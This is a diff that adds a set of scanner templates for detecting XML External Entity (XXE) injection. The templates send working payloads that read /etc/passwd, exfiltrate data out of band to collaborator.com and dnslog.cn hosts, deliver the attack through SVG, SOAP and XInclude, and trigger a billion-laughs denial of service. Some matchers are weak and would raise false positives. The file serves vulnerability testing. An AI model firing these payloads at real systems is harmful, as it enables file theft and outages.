@@ -1,0 +1,180 @@
+id: xxe-basic
+info:
+  name: Basic XXE Injection
+  author: AniipID
+  severity: critical
+  description: Detects XML External Entity injection via classic DOCTYPE
+  tags: xxe,xml,injection
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/xml"
+      - "{{BaseURL}}/upload"
+    body: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
+    headers:
+      Content-Type: "application/xml"
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+        condition: or
+        name: "xxe-passwd-exfil"
+---
+id: xxe-blind-oob
+info:
+  name: Blind XXE via OOB
+  author: AniipID
+  severity: critical
+  description: Detects blind XXE via out-of-band data exfiltration
+  tags: xxe,blind,oob
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/xml"
+    body: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{{Hostname}}.collaborator.com/xxe">%xxe;]><root>test</root>'
+    headers:
+      Content-Type: "application/xml"
+    matchers:
+      - type: word
+        words:
+          - "collaborator"
+          - "xxe"
+        condition: or
+        name: "xxe-oob-triggered"
+---
+id: xxe-parameter-entity
+info:
+  name: XXE Parameter Entity
+  author: AniipID
+  severity: critical
+  description: Detects XXE using parameter entities for data exfiltration
+  tags: xxe,parameter-entity,exfil
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/xml"
+    body: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{{Hostname}}.collaborator.com/xxe?data=%file;">%dtd;]><root>test</root>'
+    headers:
+      Content-Type: "application/xml"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "collaborator"
+        condition: or
+        name: "xxe-param-exfil"
+---
+id: xxe-svg-upload
+info:
+  name: XXE via SVG Upload
+  author: AniipID
+  severity: critical
+  description: Detects XXE via malicious SVG file upload
+  tags: xxe,svg,upload
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/media/upload"
+    body: '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&xxe;</text></svg>'
+    headers:
+      Content-Type: "image/svg+xml"
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        name: "xxe-svg-exfil"
+---
+id: xxe-dos
+info:
+  name: XXE Billion Laughs DoS
+  author: AniipID
+  severity: medium
+  description: Detects XXE that allows entity expansion DoS (billion laughs)
+  tags: xxe,dos,billion-laughs
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/xml"
+    body: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><root>&lol4;</root>'
+    headers:
+      Content-Type: "application/xml"
+    matchers:
+      - type: word
+        words:
+          - "500"
+          - "Error"
+          - "timeout"
+        condition: or
+        name: "xxe-dos-crash"
+---
+id: xxe-soap
+info:
+  name: XXE via SOAP
+  author: AniipID
+  severity: critical
+  description: Detects XXE in SOAP web services
+  tags: xxe,soap,xml
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/soap"
+      - "{{BaseURL}}/api/soap"
+      - "{{BaseURL}}/ws"
+    body: '<soap:Body><?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Fault><faultcode>&xxe;</faultcode></soap:Fault></soap:Body>'
+    headers:
+      Content-Type: "text/xml;charset=UTF-8"
+      SOAPAction: ""
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        name: "xxe-soap-exfil"
+---
+id: xxe-dtd-retrieval
+info:
+  name: XXE External DTD Retrieval
+  author: AniipID
+  severity: high
+  description: Detects XXE that can retrieve external DTDs
+  tags: xxe,dtd,external
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+    body: '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://{{Hostname}}.dnslog.cn/evil.dtd"><root>test</root>'
+    headers:
+      Content-Type: "application/xml"
+    matchers:
+      - type: word
+        words:
+          - "dnslog"
+        condition: or
+        name: "dtd-retrieval"
+---
+id: xxe-xinclude
+info:
+  name: XXE via XInclude
+  author: AniipID
+  severity: critical
+  description: Detects XXE using XInclude for file inclusion
+  tags: xxe,xinclude,xml
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/xml"
+    body: '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>'
+    headers:
+      Content-Type: "application/xml"
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        name: "xxe-xinclude-exfil"
